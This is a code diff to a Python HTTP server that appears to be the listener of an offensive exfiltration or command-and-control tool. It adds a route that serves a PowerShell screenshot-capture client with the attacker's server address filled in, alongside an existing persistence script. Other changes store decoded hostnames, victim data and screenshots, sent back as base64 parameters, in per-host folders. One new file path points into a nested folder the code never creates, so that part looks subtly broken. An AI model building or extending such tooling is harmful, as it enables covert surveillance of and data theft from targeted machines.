@@ -112,6 +112,21 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] File client_pers.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
+        elif self.path == '/screen':
+            try:
+                file_to_open = open('scripts/client_screen.ps1','r').read()
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
+                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+            except:
+                log('[-] File client_screen.ps1 does not exist.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
         elif headers['Proof']:    
             if '?' in self.path:
                 self.send_response(200)
@@ -123,9 +138,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                     if 'hostname' in params:
                         hostname_bytes = base64.b64decode(unquote(params['hostname'])).replace(b'\x00',b'')
                         hostname_str = hostname_bytes.decode("windows-1252")
-                        if not os.path.exists(CURRENT_DIR + '/' + hostname_str):
-                            os.mkdir(CURRENT_DIR + '/' + hostname_str,mode = 0o777)
-                            log('[+] Created folder: ' + CURRENT_DIR + '/' + hostname_str,print_console=True,trace_time=True)
+                        if not os.path.exists(CURRENT_DIR + '/output/' + hostname_str):
+                            os.mkdir(CURRENT_DIR + '/output/' + hostname_str,mode = 0o777)
+                            log('[+] Created folder: ' + CURRENT_DIR + '/output/' + hostname_str,print_console=True,trace_time=True)
                         else:
                             pass
                         for key in params:
@@ -133,10 +148,10 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                                 param = params[key]
                                 param_bytes = base64.b64decode(unquote(param))
                                 param_str = param_bytes.decode("windows-1252")
-                                file = open(CURRENT_DIR + '/' + hostname_str + '/' + key + '.txt','w+',encoding='windows-1252')
+                                file = open(CURRENT_DIR + '/output/' + hostname_str + '/output/' + key + '.txt','w+',encoding='windows-1252')
                                 file.write(param_str)
                                 file.close()
-                                log('[+] File written: ' + CURRENT_DIR + '/' + hostname_str + '/' + key + '.txt\n',print_console=True,trace_time=True)
+                                log('[+] File written: ' + CURRENT_DIR + '/output/' + hostname_str + '/output/' + key + '.txt\n',print_console=True,trace_time=True)
                     else:
                         for key in params:
                             if key != 'hostname':
@@ -177,7 +192,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                     else:
                         pass
                     for key in params:
-                        if key != 'hostname':
+                        if key != 'hostname' and key != 'screenshot':
                             param = params[key]
                             param_bytes = base64.b64decode(unquote(param))
                             param_str = param_bytes.decode("windows-1252")
@@ -185,6 +200,14 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                             file.write(param_str)
                             file.close()
                             log('[+] File written: ' + CURRENT_DIR + '/' + hostname_str + '/' + key + '.txt\n',print_console=True,trace_time=True)
+                        elif key == 'screenshot':
+                            param = params[key]
+                            param_bytes = base64.b64decode(unquote(param))
+                            timestamp = int(datetime.now().timestamp())
+                            file = open(CURRENT_DIR + '/' + hostname_str + '/' + key + "_" + str(timestamp) + '.png', "wb")
+                            file.write(param_bytes)
+                            file.close()
+                            log('[+] File written: ' + CURRENT_DIR + '/' + hostname_str + '/' + key + "_" + str(timestamp) + '.png\n',print_console=True,trace_time=True)
                 else:
                     for key in params:
                         if key != 'hostname':
